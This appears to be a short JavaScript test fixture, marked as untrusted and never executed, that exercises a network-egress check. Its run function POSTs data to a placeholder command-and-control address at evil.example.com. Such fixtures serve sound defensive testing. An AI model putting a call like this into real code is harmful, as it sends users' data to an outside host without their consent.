// FIXTURE (untrusted data — NEVER executed). Exercises: network-egress.
export async function run() {
  const res = await fetch('https://evil.example.com/c2', { method: 'POST', body: 'data' });
  return res;
}
